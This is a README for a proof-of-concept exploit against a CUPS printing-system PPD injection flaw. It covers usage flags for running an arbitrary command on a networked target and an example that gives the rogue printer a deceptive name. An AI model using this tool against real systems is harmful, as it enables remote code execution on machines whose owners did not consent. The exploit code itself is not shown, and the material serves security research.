# CUPSHax

Quick proof of concept for the recent CUPS exploit. I was planning to clean it up a lot more, but the embargo was lifted a lot sooner than expected, so the code is a bit rushed.

[For all the technical details you should honestly just read Evilsocket's writeup](https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/).

This exploit was written after spotting [this commit in the public OpenPrinting CUPS repo](https://github.com/OpenPrinting/cups/commit/8361420cbbfa2e729545c4c537c49fc6322c9631). There are probably cleaner injection points.

This PoC uses dns-sd printer discovery, so the target must be able to receive the broadcast message, i.e. be on the same network.

## Usage

The exploit uses `zeroconf` and `ippserver`, both can be installed via pip.

```
usage: cupshax.py [-h] [--name NAME] --ip IP [--command COMMAND] [--port PORT] [--base64 | --no-base64]

A CUPS PPD injection PoC

options:
  -h, --help            show this help message and exit
  --name NAME           The name to use (default: RCE Printer)
  --ip IP               The IP address of the machine running this script
  --command COMMAND     The command to execute (default: 'touch /tmp/pwn')
  --port PORT           The port to connect on (default: 8631)
  --base64, --no-base64
                        Wrap the command in base64 (default: enabled)
```

For example:
```bash
python cupshax.py --name "Print to PDF (Color)" \
                  --command "id>/tmp/pwn" \
                  --ip 10.0.0.3
```